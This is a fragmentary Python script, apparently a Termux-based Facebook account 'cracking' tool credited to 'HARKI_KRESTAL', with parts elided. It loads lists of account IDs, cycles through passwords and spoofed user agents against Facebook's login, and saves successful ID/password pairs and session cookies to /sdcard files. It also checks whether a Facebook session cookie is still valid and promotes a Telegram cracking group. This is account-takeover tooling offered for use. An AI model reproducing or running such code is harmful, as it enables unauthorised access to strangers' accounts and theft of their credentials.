...
print('\033[1;92m\033[1;92m\033[1;92m \033[1;92mBaxer Beyt Bo Naw Tool ')
time.sleep(0.000)
#print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TELEGRAM GROUP")
time.sleep(0.000)
os.system(f'xdg-open https://t.me/harki_cracker')
print('\033[1;92m\033[1;92m\033[1;92m \033[1;92mXAWAN AMRAZ ')
os.system('clear')
#------------------[ HARKI ]-------------------#
#------------------[ USER-AGENT ]-------------------#
		...
		with requests.Session() as r:
			try:
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" Cookie Invalid...", end='\r');time.sleep(0.000);print("                     ", end='\r');exit()
				else:
...
#------------------[ HARKI ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ugen2=['Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 5.1;']
...
\x1b[1;31mAuthor : HARKI_KRESTAL
\x1b[1;31mTelegram : @D79_13 
\x1b[1;31mTb : Bawky awam decode bkat
\x1b[1;31mVersion : 179.1
"""
os.system('clear')
print(logo)
pass
...
def menu():
    os.system('clear')
    print(logo)
    print(f"""\x1b[1;92m[1] \x1b[1;92m\x1b[1;92mCRACK FILE""")
    print("""\x1b[1;93m[0] \x1b[1;93m\x1b[1;93mLOG OUT""")
    HARKI = input('\033[1;92mCHOOSE :  ')
    if HARKI in ['111']:
        login()
        dump_massal()
    elif  HARKI in ['1']:
...
def crack_file():
    o = input('\033[1;92mEnter a File Name :\033[1;92m ')
...
def setting():
    print("\x1b[1;93m[1] NORMAL IDS")
    print("\x1b[1;92m[2] VIP IDS")
    ...
    if hu in ['1','01']:
        ...
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print("\033[1;92m[1] METHOD ➠ KOREK ")
    print("\033[1;93m[2] METHOD ➠ WIFI [ WAIT IT'S A WORK ] ")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{Z}{H}«HARKI_KRESTAL-V8»    {H}{loop}{H}/{M}{len(id)}    {H}OK${ok}    {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{K}\n[HARKI_KRESTAL-CP]\nId : {idf}\nPass : {pw}{N}')
                open('/sdcard/HARKI_KRESTAL-CP.txt','a').write(idf+' | '+pw+'\n')
                akun.append(idf+' | '+pw)
                cp+=1
                break
                ...
                print(f'\r{H}\n[HARKI_KRESTAL-OK]\nId : {idf}\nPass : {pw}\nCookie : {kuki}\nUserAgent : {ua}{N}')
                os.system('espeak -a 300 " HARKI_KRESTAL,  Ok, "')
                open('/sdcard/HARKI_KRESTAL-Ok.txt','a').write(idf+' | '+pw+'\n')
                cek_HARKI_KRESTAL(kuki)
                break
